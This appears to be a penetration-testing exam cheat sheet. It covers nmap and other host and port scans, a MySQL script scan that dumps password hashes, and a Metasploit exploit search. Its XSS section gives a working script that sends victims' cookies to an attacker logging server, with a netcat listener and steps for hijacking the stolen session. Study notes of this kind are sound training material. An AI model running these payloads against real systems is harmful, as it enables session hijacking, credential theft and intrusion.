# Exam Prep

### Discovering Hosts

* `fping -a -g 192.168.0.1/24 2>/dev/null` - using fping utility.
* `sudo netdiscover -i eth0 -r 192.168.0.1/24` - using netdiscover utility.
* `sudo arp-scan -I eth0 -g 192.168.0.1/24` - using arp-scan utility.
* `nmap -sn -T4 192.168.0.1/24 -oG - | awk '/Up$/{print $2}'` - using nmap utility.

### Open TCP Ports Scan

* `nmap -Pn -n -T4 -sV -p- $ip --open` -**1st scan**, `--max-scan-delay 0` - optional.
* `nmap -Pn -n -T4 -p-  -A -oN indepth_scan.txt` - **2nd scan.**

### Open Udp Ports Scan

* `nmap -sU -sV 10.10.10.0/24` - UDP scan, add other options if needed.

### XSS

{% code overflow="wrap" lineNumbers="true" %}
```bash
check example:

<script>alert("hack :)")</script>

hijack cookie through xss

there are four components as follows:

    attacker client pc
    attacker logging server
    vulnerable server
    victim client pc

    attacker: first finds a vulnerable server and its breach point.

    attacker: enter the following snippet in order to hijack the cookie kepts by victim client pc (p.s.: the ip address, 192.168.99.102, belongs to attacker logging server in this example):

<script>var i = new Image();i.src="http://192.168.99.102/log.php?q="+document.cookie;</script>

    attacker: log into attacker logging server (P.S.: it is 192.168.99.102 in this example), and execute the following command:

nc -vv -k -l -p 80

    attacker: when victim client pc browses the vulnerable server, check the output of the command above.

    attacker: after obtaining the victim's cookie, utilize a firefox's add-on called Cookie Quick Manager to change to the victim's cookie in an effort to hijack

    the victim's privilege.


```
{% endcode %}

### mysql

scan:

{% code overflow="wrap" %}
```
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.10.13
```
{% endcode %}

### msfconsole

search exploit

```
msf> search cve:2011 port:135 platform:windows target:XP
```
